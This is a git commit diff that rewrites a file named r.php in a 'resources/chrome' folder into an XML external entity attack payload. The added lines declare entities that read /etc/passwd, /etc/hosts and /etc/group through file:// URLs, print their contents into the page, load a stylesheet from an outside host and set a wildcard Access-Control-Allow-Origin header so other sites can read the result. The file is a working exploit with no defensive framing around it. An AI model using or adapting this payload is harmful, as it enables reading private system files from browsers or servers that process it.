8982186e64a880c2ba687a7925dd9f0ed4cb29a1
SummerSec <47944478+SummerSec@users.noreply.github.com>
2023-11-17 10:47:45 +0800

    Update r.php

--- resources/chrome/r.php
+++ resources/chrome/r.php
@@ -1,12 +1,27 @@
+<?xml-stylesheet type="text/xml" href="https://sumsec.me"?>
+<!DOCTYPE p [
+<!ENTITY passwd SYSTEM "file:///etc/passwd">
+<!ENTITY hosts SYSTEM "file:///etc/hosts">
+<!ENTITY group SYSTEM "file://localhost/etc/group">
+
+]> 
+
 <p>
+
+
   <p style="border-style: dotted;">/etc/passwd: 
+
 &passwd;
   </p>
  <p style="border-style: dotted;">/etc/hosts:
+
 &hosts;
   </p>
  <p style="border-style: dotted;">/etc/group:
+
 &group;
   </p>
+
 </p>
+
 <?php header("Access-Control-Allow-Origin: *");?>
